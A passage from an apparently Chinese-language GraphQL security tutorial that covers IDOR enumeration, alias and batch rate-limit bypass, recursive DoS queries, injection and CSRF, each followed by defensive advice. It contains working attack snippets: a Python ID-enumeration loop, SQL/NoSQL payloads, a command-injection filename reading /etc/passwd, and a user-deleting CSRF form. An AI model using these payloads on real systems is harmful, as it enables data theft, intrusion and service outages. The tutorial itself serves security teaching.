class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>将上述查询的结果保存后，可以使用在线工具或本地脚本解析 Schema，快速发现敏感查询（如 <code>user</code>、<code>allUsers</code>、<code>logs</code>、<code>systemConfig</code>）和敏感字段（如 <code>password</code>、<code>token</code>、<code>secretKey</code>、<code>creditCard</code>）。</p>
+<h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h3><ul>
+<li>生产环境关闭内省：大多数 GraphQL 框架支持通过配置禁用内省。</li>
+<li>若无法关闭，可对内省查询添加认证和授权校验。</li>
+<li>定期自查端点，确认内省不可用。</li>
+</ul>
+<h2 id="二、越权与-IDOR-via-GraphQL"><a href="#二、越权与-IDOR-via-GraphQL" class="headerlink" title="二、越权与 IDOR via GraphQL"></a>二、越权与 IDOR via GraphQL</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>GraphQL 的嵌套查询使得传统基于 URL 路径的访问控制变得更加复杂。由于所有请求走同一个端点，权限校验必须下沉到 Resolver 层级，否则容易出现水平或垂直越权。</p>
+<h3 id="场景：通过修改查询参数实现-IDOR"><a href="#场景：通过修改查询参数实现-IDOR" class="headerlink" title="场景：通过修改查询参数实现 IDOR"></a>场景：通过修改查询参数实现 IDOR</h3><p>假设存在查询 <code>user(id: ID!): User</code>，攻击者可通过修改 <code>id</code> 参数访问其他用户的数据。</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正常请求：查询 ID 为 42 的用户</span></span><br><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">42</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    name</span><br><span class="line">    email</span><br><span class="line">    phone</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 越权请求：遍历 ID 获取所有用户数据</span></span><br><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="symbol">u1</span><span class="punctuation">:</span> user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span> name email phone <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="symbol">u2</span><span class="punctuation">:</span> user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span> name email phone <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="symbol">u3</span><span class="punctuation">:</span> user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span> name email phone <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>批量遍历自动化：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">query_template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">query &#123;</span></span><br><span class="line"><span class="string">  user(id: %d) &#123;</span></span><br><span class="line"><span class="string">    id</span></span><br><span class="line"><span class="string">    name</span></span><br><span class="line"><span class="string">    email</span></span><br><span class="line"><span class="string">    phone</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> uid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    query = query_template % uid</span><br><span class="line">    r = requests.post(</span><br><span class="line">        <span class="string">&#x27;https://target.com/graphql&#x27;</span>,</span><br><span class="line">        json=&#123;<span class="string">&#x27;query&#x27;</span>: query&#125;,</span><br><span class="line">        headers=&#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer &lt;token&gt;&#x27;</span>&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;null&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Found user <span class="subst">&#123;uid&#125;</span>: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="嵌套越权"><a href="#嵌套越权" class="headerlink" title="嵌套越权"></a>嵌套越权</h3><p>GraphQL 的嵌套特性也使得通过关联关系进行越权成为可能：</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过所属组织越权访问其他团队的成员</span></span><br><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  organization<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    name</span><br><span class="line">    members <span class="punctuation">&#123;</span></span><br><span class="line">      id</span><br><span class="line">      name</span><br><span class="line">      email         <span class="comment"># 可能看到非本团队成员的信息</span></span><br><span class="line">      personalPhone <span class="comment"># 敏感字段</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防御建议-1"><a href="#防御建议-1" class="headerlink" title="防御建议"></a>防御建议</h3><ul>
+<li>在 Resolver 层实施细粒度的字段级访问控制。</li>
+<li>避免依赖客户端传入的 ID 作为唯一鉴权依据，应结合当前会话的上下文进行校验。</li>
+<li>使用 GraphQL Shield 或自定义指令实现声明式权限控制。</li>
+</ul>
+<h2 id="三、批量查询绕过速率限制"><a href="#三、批量查询绕过速率限制" class="headerlink" title="三、批量查询绕过速率限制"></a>三、批量查询绕过速率限制</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>REST API 的速率限制通常基于请求数量。但 GraphQL 的一个请求可以包含多个独立查询（Batching）或通过别名在一次查询中请求大量数据，从而轻松绕过传统的基于请求次数的速率限制。</p>
+<h3 id="Query-Batching"><a href="#Query-Batching" class="headerlink" title="Query Batching"></a>Query Batching</h3><p>部分 GraphQL 实现支持在一个 HTTP 请求中发送多个查询操作：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="string">&quot;query &#123; user(id: 1) &#123; email &#125; &#125;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="string">&quot;query &#123; user(id: 2) &#123; email &#125; &#125;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="string">&quot;query &#123; user(id: 3) &#123; email &#125; &#125;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="string">&quot;query &#123; user(id: 100) &#123; email &#125; &#125;&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+
+<p>如果服务端接受数组形式的请求体，攻击者可以在单个 HTTP 请求中打包数百个查询，而速率限制器只计为一次请求。</p>
+<h3 id="别名轰炸（Alias-based-Batching）"><a href="#别名轰炸（Alias-based-Batching）" class="headerlink" title="别名轰炸（Alias-based Batching）"></a>别名轰炸（Alias-based Batching）</h3><p>即使不启用 Batching，也可通过别名在一次查询中实现类似效果：</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="symbol">a1</span><span class="punctuation">:</span> user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span> email <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="symbol">a2</span><span class="punctuation">:</span> user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span> email <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="symbol">a3</span><span class="punctuation">:</span> user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span> email <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="symbol">a4</span><span class="punctuation">:</span> user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span> email <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="symbol">a5</span><span class="punctuation">:</span> user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span> email <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="comment"># ... 可继续叠加至数千个别名</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>自动化生成别名的脚本片段：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_alias_query</span>(<span class="params">field, ids, subfields</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成别名轰炸查询&quot;&quot;&quot;</span></span><br><span class="line">    aliases = []</span><br><span class="line">    <span class="keyword">for</span> i, uid <span class="keyword">in</span> <span class="built_in">enumerate</span>(ids):</span><br><span class="line">        aliases.append(<span class="string">f&quot;  a<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;field&#125;</span>(id: <span class="subst">&#123;uid&#125;</span>) &#123;&#123; <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(subfields)&#125;</span> &#125;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;query &#123;\n&quot;</span> + <span class="string">&quot;\n&quot;</span>.join(aliases) + <span class="string">&quot;\n&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防御建议-2"><a href="#防御建议-2" class="headerlink" title="防御建议"></a>防御建议</h3><ul>
+<li>实施查询成本分析（Query Cost Analysis）：为每个字段分配成本权重，限制单次查询的总成本。</li>
+<li>限制单次查询中允许的别名数量上限。</li>
+<li>禁用 Query Batching 功能或将其纳入速率限制计算。</li>
+<li>结合令牌桶或滑动窗口算法，按实际解析的字段数量而非请求次数进行限速。</li>
+</ul>
+<h2 id="四、深度递归-DoS-攻击"><a href="#四、深度递归-DoS-攻击" class="headerlink" title="四、深度递归 DoS 攻击"></a>四、深度递归 DoS 攻击</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>GraphQL 的嵌套查询语法使得攻击者可以构造极深的递归查询，导致服务端在解析和执行时消耗大量 CPU 和内存资源，造成拒绝服务。</p>
+<h3 id="攻击载荷示例"><a href="#攻击载荷示例" class="headerlink" title="攻击载荷示例"></a>攻击载荷示例</h3><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> DeepDoSAttack <span class="punctuation">&#123;</span></span><br><span class="line">  user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    posts <span class="punctuation">&#123;</span></span><br><span class="line">      author <span class="punctuation">&#123;</span></span><br><span class="line">        posts <span class="punctuation">&#123;</span></span><br><span class="line">          author <span class="punctuation">&#123;</span></span><br><span class="line">            posts <span class="punctuation">&#123;</span></span><br><span class="line">              author <span class="punctuation">&#123;</span></span><br><span class="line">                posts <span class="punctuation">&#123;</span></span><br><span class="line">                  author <span class="punctuation">&#123;</span></span><br><span class="line">                    posts <span class="punctuation">&#123;</span></span><br><span class="line">                      author <span class="punctuation">&#123;</span></span><br><span class="line">                        name</span><br><span class="line">                      <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                  <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>更隐蔽的方式是利用循环引用关系构造”无限深度”查询：</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果 User -&gt; Post -&gt; User 形成循环</span></span><br><span class="line"><span class="keyword">query</span> CyclicDoS <span class="punctuation">&#123;</span></span><br><span class="line">  user<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    posts <span class="punctuation">&#123;</span></span><br><span class="line">      author <span class="punctuation">&#123;</span></span><br><span class="line">        posts <span class="punctuation">&#123;</span></span><br><span class="line">          author <span class="punctuation">&#123;</span></span><br><span class="line">            posts <span class="punctuation">&#123;</span></span><br><span class="line">              author <span class="punctuation">&#123;</span></span><br><span class="line">                posts <span class="punctuation">&#123;</span></span><br><span class="line">                  author <span class="punctuation">&#123;</span></span><br><span class="line">                    posts <span class="punctuation">&#123;</span></span><br><span class="line">                      author <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="comment"># ... 可持续嵌套</span></span><br><span class="line">                        name</span><br><span class="line">                      <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                  <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防御建议-3"><a href="#防御建议-3" class="headerlink" title="防御建议"></a>防御建议</h3><ul>
+<li>设置最大查询深度（Max Query Depth），通常建议限制在 7-10 层。</li>
+<li>设置查询超时时间，超时后强制终止解析。</li>
+<li>实施查询复杂度限制，为每个字段分配复杂度分数，对总复杂度超过阈值的请求直接拒绝。</li>
+<li>使用持久化查询（Persisted Queries），只允许预先注册的查询结构执行。</li>
+</ul>
+<h2 id="五、参数注入与字段建议攻击"><a href="#五、参数注入与字段建议攻击" class="headerlink" title="五、参数注入与字段建议攻击"></a>五、参数注入与字段建议攻击</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>GraphQL 查询中的参数是攻击者注入恶意数据的重要入口。如果 Resolver 在底层数据库查询或系统命令中直接拼接参数，就可能导致注入漏洞。</p>
+<h3 id="SQL-NoSQL-注入"><a href="#SQL-NoSQL-注入" class="headerlink" title="SQL &#x2F; NoSQL 注入"></a>SQL &#x2F; NoSQL 注入</h3><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设底层查询为: SELECT * FROM users WHERE name = &#x27;&#123;input&#125;&#x27;</span></span><br><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  users<span class="punctuation">(</span><span class="symbol">name</span><span class="punctuation">:</span> <span class="string">&quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    id</span><br><span class="line">    name</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># NoSQL 注入示例（针对 MongoDB 后端）</span></span><br><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  users<span class="punctuation">(</span><span class="symbol">filter</span><span class="punctuation">:</span> <span class="string">&quot;&#123;\&quot;$gt\&quot;: \&quot;\&quot;&#125;&quot;</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    id</span><br><span class="line">    name</span><br><span class="line">    email</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="OS-命令注入"><a href="#OS-命令注入" class="headerlink" title="OS 命令注入"></a>OS 命令注入</h3><p>如果字段参数被传入系统命令：</p>
+<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  report<span class="punctuation">(</span><span class="symbol">filename</span><span class="punctuation">:</span> <span class="string">&quot;report1; cat /etc/passwd&quot;</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    content</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="字段建议（Field-Suggestions）信息泄露"><a href="#字段建议（Field-Suggestions）信息泄露" class="headerlink" title="字段建议（Field Suggestions）信息泄露"></a>字段建议（Field Suggestions）信息泄露</h3><p>GraphQL 引擎在遇到拼写错误的字段时，可能返回建议信息，从而泄露 Schema 中存在的字段名称：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST https://target.com/graphql \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;query&quot;: &quot;query &#123; user(id: 1) &#123; passwor &#125; &#125;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;errors&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Cannot query field \&quot;passwor\&quot; on type \&quot;User\&quot;.</span></span><br><span class="line"><span class="string">                  Did you mean \&quot;password\&quot;?&quot;</span>,</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可利用此特性进行字段名枚举，逐步拼凑出完整的数据结构。</p>
+<h3 id="防御建议-4"><a href="#防御建议-4" class="headerlink" title="防御建议"></a>防御建议</h3><ul>
+<li>所有用户输入的参数在使用前必须进行严格的类型校验与参数化处理。</li>
+<li>使用 ORM 或参数化查询，杜绝字符串拼接。</li>
+<li>生产环境关闭字段建议功能。</li>
+<li>对敏感字段名进行混淆或在 Schema 层面进行隐藏。</li>
+</ul>
+<h2 id="六、GraphQL-CSRF-与-CORS-配置不当"><a href="#六、GraphQL-CSRF-与-CORS-配置不当" class="headerlink" title="六、GraphQL CSRF 与 CORS 配置不当"></a>六、GraphQL CSRF 与 CORS 配置不当</h2><h3 id="CSRF-攻击"><a href="#CSRF-攻击" class="headerlink" title="CSRF 攻击"></a>CSRF 攻击</h3><p>GraphQL 端点通常接受 <code>application/json</code> 的 POST 请求，这使得传统的表单 CSRF 较难实施。但如果端点也接受 <code>application/x-www-form-urlencoded</code> 或 GET 请求，CSRF 攻击就变得可行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 若端点接受 application/x-www-form-urlencoded --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://target.com/graphql&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">value</span>=<span class="string">&quot;mutation &#123; deleteUser(id: 1) &#123; id &#125; &#125;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click Me&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>检测端点内容类型支持：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试 GET 请求</span></span><br><span class="line">curl <span class="string">&quot;https://target.com/graphql?query=query+%7B+__typename+%7D&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试 form-urlencoded</span></span><br><span class="line">curl -X POST https://target.com/graphql \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> \</span><br><span class="line">  -d <span class="string">&quot;query=query+%7B+__typename+%7D&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试 multipart （部分实现在文件上传时启用）</span></span><br><span class="line">curl -X POST https://target.com/graphql \</span><br><span class="line">  -F <span class="string">&quot;operations=&#123;\&quot;query\&quot;:\&quot;mutation &#123; uploadFile(file: null) &#123; id &#125; &#125;\&quot;,\&quot;variables\&quot;:&#123;\&quot;file\&quot;:null&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="CORS-配置不当"><a href="#CORS-配置不当" class="headerlink" title="CORS 配置不当"></a>CORS 配置不当</h3><p>若 GraphQL 端点的 CORS 配置信任任意 Origin 且允许携带凭证，攻击者可从恶意页面跨域发起认证请求。</p>
+<h3 id="防御建议-5"><a href="#防御建议-5" class="headerlink" title="防御建议"></a>防御建议</h3><ul>
+<li>仅接受 <code>application/json</code> 类型的 POST 请求。</li>
+<li>严格配置 CORS 白名单，禁止 <code>Access-Control-Allow-Origin: *</code> 与 <code>Access-Control-Allow-Credentials: true</code> 同时出现。</li>
+<li>实施 CSRF Token 或自定义 Header 校验。</li>
+</ul>
+<h2 id="七、安全测试工具"><a href="#七、安全测试工具" class="headerlink" title="七、安全测试工具"></a>七、安全测试工具</h2><h3 id="GraphQL-Voyager"><a href="#GraphQL-Voyager" class="headerlink" title="GraphQL Voyager"></a>GraphQL Voyager</h3><p><a target="_blank" rel="noopener" href="https://github.com/APIs-guru/graphql-voyager">GraphQL Voyager</a> 将内省结果可视化为交互式关系图。安全测试者可以直观地识别复杂的数据关系、循环引用和潜在的敏感字段路径。</p>
+<p><strong>使用方式：</strong></p>
+<ol>
+<li>将内省查询结果导出为 <code>schema.json</code>。</li>
+<li>在 <a target="_blank" rel="noopener" href="https://graphql-kit.com/graphql-voyager/">graphql-voyager.com</a> 上传文件，即可生成可视化图谱。</li>
+<li>重点关注标红的循环引用链路，这些往往也是深度 DoS 攻击的切入点。</li>
+</ol>
+<h3 id="InQL-Burp-Suite"><a href="#InQL-Burp-Suite" class="headerlink" title="InQL (Burp Suite)"></a>InQL (Burp Suite)</h3><p><a target="_blank" rel="noopener" href="https://github.com/doyensec/inql">InQL</a> 是 Burp Suite 的扩展插件，专门用于 GraphQL 安全测试。</p>
+<p><strong>核心功能：</strong></p>
+<ul>
+<li><strong>自动内省检测与 Schema 提取：</strong> 在 Burp 的被动扫描过程中自动识别 GraphQL 端点并尝试提取 Schema。</li>
+<li><strong>查询生成器：</strong> 基于获取的 Schema 自动生成标准查询、Mutation 和 Subscription，节省手动编写的时间。</li>
+<li><strong>循环引用检测：</strong> 自动标记 Schema 中存在循环引用的类型关系，辅助查找 DoS 攻击目标。</li>
+<li><strong>搜索功能：</strong> 在 Schema 中快速搜索特定关键字（如 <code>password</code>、<code>token</code>、<code>secret</code>、<code>admin</code>）。</li>
+</ul>
+<p><strong>使用流程：</strong></p>
